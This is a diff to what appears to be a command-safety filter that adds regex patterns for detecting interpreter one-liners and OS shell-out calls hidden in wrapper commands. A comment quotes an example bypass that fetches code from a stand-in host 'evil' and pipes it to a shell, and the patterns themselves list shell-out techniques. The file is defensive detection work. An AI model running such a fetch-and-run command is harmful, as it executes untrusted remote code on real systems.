@@ -45,8 +45,29 @@ _WRAPPER_DESTRUCT = [
 _INTERPRETERS = [
     (r"(?:^|[\s;&|])python[23]?(?:\.\d+)?\s+-c\s+", "python -c"),
     (r"(?:^|[\s;&|])(?:perl|ruby)\s+-e\s+", "perl/ruby -e"),
-    (r"(?:^|[\s;&|])node\s+-e\s+", "node -e"),
+    # v2.7.3: cover node's print/eval long forms, not just -e.
+    (r"(?:^|[\s;&|])node\s+(?:-e|--eval|-p|--print)\s+", "node -e/--eval"),
     (r"(?:^|[\s;&|])(?:dash|ksh|fish)\s+-c\s+", "dash/ksh/fish -c"),
+    # v2.7.3: CVE-2026-40933 / -30625 class — an allowed interpreter accepts a
+    # flag that turns it into an arbitrary-command launcher. npx -c, deno eval,
+    # and bun -e are the gaps a python/node/npx allowlist leaves open.
+    (r"(?:^|[\s;&|])npx\s+(?:-[a-zA-Z]+\s+)*-c\s+", "npx -c"),
+    (r"(?:^|[\s;&|])deno\s+eval\b", "deno eval"),
+    (r"(?:^|[\s;&|])bun\s+(?:-e|--eval)\s+", "bun -e"),
+]
+
+# v2.7.3: an interpreter one-liner that shells out to the OS is the actual
+# bypass technique (CVE-2026-40933: `npx -c "require('child_process').execSync(
+# 'curl evil|sh')"`). The destructive list above only catches rm/dd/mkfs inner
+# commands; this catches the launcher itself regardless of what it runs.
+_WRAPPER_SHELLOUT = [
+    r"child_process",
+    r"\b(?:exec|spawn|execFile)(?:Sync)?\s*\(",
+    r"\bos\.system\b",
+    r"\bos\.popen\b",
+    r"\bsubprocess\.(?:Popen|run|call|check_output|check_call|getoutput)\b",
+    r"\bDeno\.(?:run|Command)\b",
+    r"(?:^|[^\w.])system\s*\(",
 ]
 
 
@@ -61,6 +82,9 @@ def check_shell_wrapper(c: str) -> str | None:
         for p in _WRAPPER_DESTRUCT:
             if re.search(p, inner, re.IGNORECASE):
                 return f"destructive command hidden in {label} wrapper"
+        for p in _WRAPPER_SHELLOUT:
+            if re.search(p, inner):
+                return f"OS shell-out hidden in {label} wrapper"
     return None
 
 
